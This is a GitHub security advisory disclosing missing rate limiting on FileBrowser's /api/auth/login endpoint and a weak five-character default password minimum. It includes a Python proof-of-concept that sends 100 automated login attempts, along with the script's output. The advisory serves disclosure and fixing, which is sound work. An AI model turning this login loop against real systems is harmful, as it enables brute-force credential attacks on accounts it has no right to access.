# [M] FileBrowser: Missing Rate Limiting on Authentication Endpoint Enables Brute Force Attacks

## Summary
Severity: Medium
Advisory: GHSA-r4v7-6wcg-ghj5
CWE: CWE-307
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N (CVSS_V3)
Published: 2026-06-25
Source: https://github.com/advisories/GHSA-r4v7-6wcg-ghj5
Type: github-advisory

## Affected
- Go: `github.com/gtsteffaniak/filebrowser` — affected >=0 <0.0.0-20260522161427-fa5abc8c67f3a

## Details
### Summary
The `/api/auth/login` endpoint does not implement rate limiting, account lockout, or progressive backoff for repeated authentication failures. As a result, an attacker can perform unlimited login attempts against the endpoint. When combined with the username enumeration timing vulnerability, valid accounts can be identified and then brute-forced without restriction. The risk is further increased by a weak default password policy that only enforces a minimum length of five characters.


### Details
The authentication endpoint `/api/auth/login` does not enforce any form of rate limiting, account lockout, or progressive backoff for repeated failed login attempts. Testing confirmed that the endpoint accepts an unlimited number of authentication attempts from the same client without delay or restriction.

This allows attackers to repeatedly attempt password guesses against valid usernames.

Secure authentication systems typically enforce request throttling, temporary account lockout, or progressive delays after repeated failed login attempts to mitigate brute-force attacks.
```
$ python rate-limit-probe.py
[*] Probing http://localhost/api/auth/login for rate limiting, lockout, and backoff behavior...
    Attempt  10: status=401, latency=0.0411s
    Attempt  20: status=401, latency=0.0411s
    Attempt  30: status=401, latency=0.0402s
    Attempt  40: status=401, latency=0.0420s
    Attempt  50: status=401, latency=0.0403s
    Attempt  60: status=401, latency=0.0423s
    Attempt  70: status=401, latency=0.0474s
    Attempt  80: status=401, latency=0.0417s
    Attempt  90: status=401, latency=0.0407s
    Attempt 100: status=401, latency=0.0407s

--- CONCRETE EVIDENCE ---
Attempts completed:        100
Total runtime:             4.17s
Average request rate:      23.98 req/sec
Unique status codes:       [401]
Average time (first 5):    0.0447s
Average time (last 5):     0.0408s
Latency delta:             -0.0038s
[RESULT] No HTTP 429 responses observed.
[RESULT] No progressive backoff detected: response timing remained effectively constant.
```
#### Additional Context
Password validation is implemented in `backend/database/storage/bolt/user.go` via `checkPassword()`, which only verifies that the supplied password length is greater than or equal to settings.Config.Auth.Methods.PasswordAuth.MinLength. In `backend/common/settings/auth.go`, the PasswordAuthConfig documents the default value of MinLength as 5. No additional complexity requirements, such as uppercase, lowercase, numeric, or special character checks, were identified in this code path.

### PoC
The script below demonstrates the lack of rate limiting by performing a high volume automated authentication test.  The script sends sequential login requests and monitors for HTTP 429 (Too Many Requests) status codes. 

```
import requests
import time
import statistics

URL = "http://localhost/api/auth/login"
USERNAME = "admin"
PASSWORD = "wrong-password"
MAX_ATTEMPTS = 100
TIMEOUT = 10

latencies = []
statuses = []

print(f"[*] Probing {URL} for rate limiting, lockout, and backoff behavior...")

start_total = time.time()

for i in range(1, MAX_ATTEMPTS + 1):
    start = time.perf_counter()

    resp = requests.post(
        URL,
        params={"username": USERNAME, "recaptcha": ""},
        headers={"X-Password": PASSWORD},
        timeout=TIMEOUT
    )

    duration = time.perf_counter() - start
    latencies.append(duration)
    statuses.append(resp.status_code)

    if resp.status_code == 429:
        print(f"[!] Rate limit detected at attempt {i} (HTTP 429)")
        break

    if i % 10 == 0:
        print(f"    Attempt {i:3}: status={resp.status_code}, latency={duration:.4f}s")

end_total = time.time()
attempts_completed = len(latencies)

print("\n--- CONCRETE EVIDENCE ---")

first_five_avg = statistics.mean(latencies[:5]) if attempts_completed >= 5 else statistics.mean(latencies)
last_five_avg = statistics.mean(latencies[-5:]) if attempts_completed >= 5 else statistics.mean(latencies)
latency_delta = last_five_avg - first_five_avg

print(f"Attempts completed:        {attempts_completed}")
print(f"Total runtime:             {end_total - start_total:.2f}s")
print(f"Average request rate:      {attempts_completed / (end_total - start_total):.2f} req/sec")
print(f"Unique status codes:       {sorted(set(statuses))}")
print(f"Average time (first 5):    {first_five_avg:.4f}s")
print(f"Average time (last 5):     {last_five_avg:.4f}s")
print(f"Latency delta:             {latency_delta:+.4f}s")

if 429 not in statuses:
    print("[RESULT] No HTTP 429 responses observed.")

if abs(latency_delta) < 0.05:
    print("[RESULT] No progressive backoff detected: response timing remained effectively constant.")
else:
    print("[RESULT] Latency variation detected: investigate possible throttling or environmental noise.")
```                                  

### Impact
An attacker can perform unlimited authentication attempts against valid usernames. When combined with the username enumeration timing vulnerability, this enables targeted brute-force attacks against user accounts and increases the likelihood of credential compromise.



Please let me know if you need any additional information or clarification.
I'm happy to assist with testing or validating a fix.

## References
- https://github.com/gtsteffaniak/filebrowser/security/advisories/GHSA-r4v7-6wcg-ghj5
- https://github.com/gtsteffaniak/filebrowser/pull/2485
- https://github.com/gtsteffaniak/filebrowser/commit/fa5abc8c67f3a66ce76e358a3c57981750c76a23
- https://github.com/gtsteffaniak/filebrowser
